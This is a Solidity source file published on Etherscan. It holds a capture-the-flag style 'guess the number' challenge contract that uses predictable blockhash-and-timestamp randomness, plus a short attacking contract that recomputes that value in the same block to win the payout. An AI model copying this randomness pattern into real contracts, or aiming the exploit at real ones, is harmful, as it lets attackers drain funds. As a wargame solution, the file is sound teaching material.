/**
 *Submitted for verification at Etherscan.io on 2022-07-03
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }
    
    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract c {
    //uint8 myanswer = ;
    
    address guess_addr  = 0x3916833c4ADA7d15eB436891c9E53D049A249bC7;

    function myguess() public payable {
        GuessTheNewNumberChallenge guessit = GuessTheNewNumberChallenge(guess_addr);
        guessit.guess.value(1 ether)(uint8(keccak256(block.blockhash(block.number - 1), now)));
    }
}